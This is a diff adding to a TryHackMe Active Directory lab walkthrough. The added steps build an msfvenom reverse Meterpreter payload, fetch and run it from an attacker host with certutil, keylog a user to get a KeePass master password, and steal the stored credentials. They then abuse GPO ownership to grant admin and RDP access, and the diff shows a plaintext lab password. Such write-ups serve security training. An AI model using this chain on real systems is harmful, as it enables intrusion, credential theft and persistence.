@@ -1410,7 +1410,7 @@ MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RE
 The query shows that there is a `SERVER MANAGEMENT@ZA.TRYHACKME.LOC` group, which has admin privileges over _`THMSERVER1`_ and a member of which is _`THMSERVER2`_. Let's connect to `THMWRK1`:
 
 ```shell
-ssh za.tryhackme.loc@justin.barnes@thmwrk1.za.tryhackme.loc
+ssh za.tryhackme.loc\\justin.barnes@thmwrk1.za.tryhackme.loc
 ```
 
 Once there we check if THMSERVER2 has the Print Spooler service running, as it is required for coercing authentication.
@@ -1525,3 +1525,156 @@ sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support
 ```
 
 Get the flag!
+
+In this attack, we will focus on targeting Active Directory users to extract stored credentials and gain deeper access to the network. Since we already have administrative control over multiple workstations and servers, our next step will be to search for valuable user data. We will begin by conducting enumeration within user directories, looking for files that might contain stored passwords. During this process, we may discover a KeePass database file, which is likely encrypted with a strong password. Instead of attempting to crack the database, which could be time-consuming and ineffective, we will shift our focus to capturing the credentials as the user types them.
+
+To achieve this, we will leverage Meterpreter’s keylogging capabilities. However, since our shell is running with SYSTEM privileges, we must first migrate to a process owned by the target user. By identifying an active explorer.exe process under the user’s session and migrating to it, we will ensure that we are in the correct context to capture keystrokes. Once the migration is complete, we will start the keylogger and wait for the user to interact with KeePass. After a period of observation, we will extract the recorded keystrokes, potentially revealing the master password for the database.
+
+Once we obtain the password, we will use it to unlock the KeePass database and retrieve stored credentials. This step could grant us access to additional privileged accounts, expanding our control over the environment. To maintain long-term access, we will create a new administrative user on the compromised system, ensuring that we can reconnect even if our current session is terminated. By enabling remote access mechanisms such as RDP, we will establish persistence for future operations. This approach will allow us to systematically escalate our privileges while maintaining stealth and control over the target network.
+
+We will be using our WinRM session with `t1` admin access for this. Let's create a payload first:
+
+```shell
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.50.45.173 LPORT=9233 -f psh -o shell.ps1
+```
+
+And start a listener:
+
+```shell
+msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 10.50.45.173; set LPORT 9233; run"
+```
+
+Also start a `python` server:
+
+```shell
+python3 -m http.server 8088
+```
+
+Now download the payload to the `t1` WinRM session:
+
+```powershell
+certutil.exe -urlcache -split -f http://10.50.45.173:8088/shell.ps1
+```
+
+And run it:
+
+```powershell
+.\shell.ps1
+```
+
+A meterpreter shell should spawn in the listener. 
+
+Find out the PID of `explorer.exe`:
+
+```meterpreter
+ps | grep "explorer"
+```
+
+Migrate to it:
+
+```meterpreter
+migrate 3636
+```
+
+Start a keystroke sniffer:
+
+```meterpreter
+keyscan_start
+```
+
+Dump the keystrokes:
+
+```meterpreter
+keyscan_dump
+```
+
+Stop the keystroke sniffer:
+
+```meterpreter
+keyscan_stop
+```
+
+This should reveal the password for the `kdbx` database.
+
+Let's look for a `*.kdbx` file:
+
+```meterpreter
+search -f *.kdbx
+```
+
+Download any of these that is 1886 bytes in size:
+
+```meterpreter
+download c:/users/t1_trevor.jones/'My Documents'/PasswordDatabase.kdbx
+```
+
+Install keepass client:
+
+```shell
+sudo apt install kpcli
+```
+
+Run it:
+
+```shell
+kpcli
+```
+
+Now execute the following command sequence to get the flag and the password:
+
+```kpcli
+open PasswordDataase.kdbx
+show -f -a PasswordDatabase/General/Flag
+```
+
+There's your flag!
+
+```kpcli
+show -f -a PasswordDatabase/General/svcServMan
+```
+
+And there's the password.
+
+In the upcoming exploitation process, keylogging will allow us to decrypt a credential database, providing access to the svcServMan account. Before leveraging these credentials, enumeration using BloodHound will help determine their privileges. Notably, this account has ownership over a Group Policy Object (GPO) applied to THMSERVER2, presenting an opportunity for further Active Directory exploitation.
+
+Since GPOs dictate system configurations across domain-joined machines, modifying them can grant elevated privileges. By exploiting this, we will add an account we control to both the local Administrators and Remote Desktop Users groups on THMSERVER2, ensuring administrative access and enabling RDP. Instead of directly logging into THMSERVER1, which may disrupt an active user session, we will RDP into THMWRK1 and inject the AD user's credentials using the `runas` command. This will allow access to Group Policy Management (GPM) via the Microsoft Management Console (MMC).
+
+Once inside GPM, we will locate the relevant GPO, edit its security settings, and create or modify the IT Support group. By adding this group to the Administrators and Remote Desktop Users groups, our controlled account will gain the necessary permissions. After applying these changes, the GPO will take effect within 15 minutes, granting us administrative control over THMSERVER2.
+
+First enumerate Privileges with BloodHound. Load collected data into BloodHound and search for svcServMan. And then identify that the account has ownership over a Group Policy Object (GPO) applied to THMSERVER2.
+
+Now let's RDP into `thmwrk1`:
+
+```shell
+xfreerdp /v:thmwrk1.za.tryhackme.loc /u:justin.barnes /p:'O8SMjhmo'
+```
+
+And at the prompt, fill in the password from the end of the previous task. 
+
+Use the runas command to impersonate the svcServMan user: 
+
+```cmd
+runas /netonly /user:za.tryhackme.loc\svcServMan cmd.exe
+```
+
+Open up `mmc.exe`:
+
+```cmd
+mmc.exe
+```
+
+In the MMC window, go to __File__ → __Add/Remove Snap-in__ and then select __Group Policy Management__ → Click __Add__ → Click __OK__.
+
+In Group Policy Management, navigate to __Servers → Management Servers → Management Server Pushes__ and Right-click the GPO and select __Edit__.
+
+Modify Restricted Groups to Add an Admin Account: __Expand Computer Configuration → Policies → Windows Settings → Security Settings__. Right-click __Restricted Groups → Add Group__. If _IT Support_ already exists, inspect it. Otherwise click __Browse__, type _IT Support_, and click __Check Names__. Click __OK__ twice.
+
+In the IT Support properties, add __Administrators__ and __Remote Desktop Users__. Click __Apply__ and __OK__.
+
+Force immediate policy update on `THMSERVER2`:
+
+```cmd
+gpupdate /force
+```
+
+RDP into THMSERVER2 using the account added to IT Support. Get the flag at Administrator desktop!
